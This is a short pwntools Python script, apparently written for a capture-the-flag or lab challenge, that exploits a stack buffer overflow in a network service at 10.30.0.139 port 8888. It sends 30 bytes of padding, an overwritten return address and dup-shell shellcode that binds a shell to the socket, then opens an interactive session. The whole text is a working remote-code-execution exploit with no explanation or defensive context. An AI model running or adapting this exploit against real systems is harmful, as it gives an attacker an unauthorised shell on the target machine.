from pwn import *
context.arch = "amd64"
context.log_level = "debug"

#io = remote("127.0.0.1",8888)
io = remote("10.30.0.139",8888)

sc = asm(shellcraft.dupsh(4))
payload = b"A"*30+p64(0x40120c)+sc 
io.send(payload)

io.interactive()
